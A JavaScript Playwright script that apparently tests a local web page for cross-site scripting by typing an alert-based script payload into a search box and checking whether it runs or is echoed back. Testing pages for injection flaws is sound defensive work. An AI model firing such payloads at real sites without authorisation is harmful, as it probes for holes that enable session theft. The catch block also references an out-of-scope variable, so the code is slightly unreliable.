import path from 'path';

export default async function(page, fileUrl, screenshotsDir) {
  try {
    // Navigate to the HTML file
    await page.goto(fileUrl);
    await page.waitForLoadState('networkidle');

    // Take initial screenshot
    const screenshots = [];
    await page.screenshot({ path: path.join(screenshotsDir, 'step_1_initial.png') });
    screenshots.push(path.join(screenshotsDir, 'step_1_initial.png'));

    // Wait for search input and fill with XSS payload
    const searchInput = await page.waitForSelector('#searchInput', { timeout: 5000 });
    await searchInput.fill('<script>alert("XSS")</script>');

    await page.screenshot({ path: path.join(screenshotsDir, 'step_2_xss_input.png') });
    screenshots.push(path.join(screenshotsDir, 'step_2_xss_input.png'));

    // Click search button using alternative selector strategy
    const searchBtn = await page.waitForSelector('button.search-btn', { timeout: 3000 });
    await searchBtn.click();

    // Wait for potential alert dialog
    await page.waitForTimeout(2000);

    // Check if alert was triggered
    const alertTriggered = await page.evaluate(() => {
      return typeof window.alertTriggered !== 'undefined' && window.alertTriggered === true;
    });

    // Take screenshot after search execution
    await page.screenshot({ path: path.join(screenshotsDir, 'step_3_after_search.png') });
    screenshots.push(path.join(screenshotsDir, 'step_3_after_search.png'));

    // Extract page content to verify XSS attempt
    const pageContent = await page.content();
    const xssDetected = pageContent.includes('<script>alert("XSS")</script>');

    return {
      success: true,
      action: "Attempted XSS injection via search input with payload: <script>alert('XSS')</script>",
      extractedData: {
        alertTriggered,
        xssPayloadDetected: xssDetected,
        pageTitle: await page.title(),
        searchResultsVisible: await page.$('.search-results') !== null
      },
      screenshots,
      error: null
    };
  } catch (error) {
    await page.screenshot({ path: path.join(screenshotsDir, 'error.png') });
    return {
      success: false,
      action: "Failed to complete XSS injection attempt",
      extractedData: {},
      screenshots: [...screenshots, path.join(screenshotsDir, 'error.png')],
      error: error.message
    };
  }
}
